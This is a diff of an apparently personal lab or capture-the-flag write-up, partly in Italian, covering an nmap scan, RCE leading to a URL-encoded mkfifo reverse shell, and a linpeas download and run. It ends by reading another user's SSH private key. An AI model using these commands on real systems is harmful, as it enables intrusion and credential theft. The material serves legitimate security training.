@@ -1,6 +1,6 @@
 ### **PORT SCANNING**
 ```bash
-nmap -Pn -sVC <ip> -vvv
+nmap -Pn -sVC 192.168.86.129 -vvv
 ```
 ![[Pasted image 20231011153211.png]]
 
@@ -63,8 +63,17 @@ rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%20
 Now use the rce to obtain a reverse shell
 ![[Pasted image 20231012163853.png]]
 *www-Data to John*
-intera home j.brock leggibile da gruppo web-developer di cui www-Data fa parte
-![[Pasted image 20231012164214.png]]
+Scarica linpeas ed avvialo
+```bash
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh
+```
+avvialo
+```bash
+./linpeas > out.txt
+```
+```bash
+wget https://github.com/carlospolop/PEASS-ng/releases/download/20231011-b4d494e5/linpeas.sh
+```
 catta id_rsa
 ``` bash
 cat /home/j.brock/.ssh/id_rsa
